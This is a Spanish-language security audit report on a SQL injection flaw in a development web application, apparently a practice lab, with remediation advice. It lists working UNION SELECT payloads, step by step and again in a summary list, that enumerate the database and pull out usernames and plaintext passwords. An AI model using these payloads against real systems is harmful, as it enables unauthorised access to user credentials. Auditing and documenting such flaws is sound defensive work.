# Informe de auditoría: SQL Injection

Objetivo: http://web.dev.local:8083
Fecha: 2026-04-13T07:57:00

Resumen:
- Vulnerabilidad encontrada: SQL Injection en parámetro GET "id" (requiere "Submit=Submit").
- Explotación: Sí — extracción de datos mediante UNION SELECT.

Evidencia y pasos realizados:
1) Provocar error sintáctico: id=1' -> muestra error de mysqli_sql_exception (low.php:11).
2) Comprobación booleano y comentario: id=1' OR '1'='1' -- & Submit=Submit -> devuelve múltiples filas.
3) Determinación columnas UNION: probado NULL counts; successful with 2 columnas.
4) Enumeración tablas: id=1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- & Submit=Submit -> retornó "users".
5) Enumeración columnas de users: id=1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- & Submit=Submit -> mostró columnas: user_id, first_name, last_name, username, password, email, ...
6) Extracción de credenciales: id=1' UNION SELECT username,password FROM users-- & Submit=Submit -> recuperadas filas (ejemplos):
   - admin : password123
   - jsmith : secret456
   - bjohnson : mypass789
   - awilliams : qwerty123

Impacto:
- Divulgación de credenciales y datos de usuarios. Acceso total a información de usuarios.

Recomendaciones:
- Usar consultas preparadas (prepared statements) con parámetros vinculados (mysqli_stmt or PDO).
- Validar y sanear/whitelist de entradas (id debe ser entero).
- Restringir privilegios del usuario DB (no usar root/db-admin).
- Deshabilitar la divulgación de errores en producción (display_errors off).
- Auditar contraseñas: almacenar hashes fuertes (bcrypt/argon2), no texto plano.

Payloads clave usados:
- 1' OR '1'='1' --
- 1' UNION SELECT 1,2--
- 1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()--
- 1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'--
- 1' UNION SELECT username,password FROM users--

Conclusión:
La aplicación es vulnerable y fue explotada con éxito para extraer datos sensibles. Implementar las recomendaciones inmediatamente.


-- Fin del informe
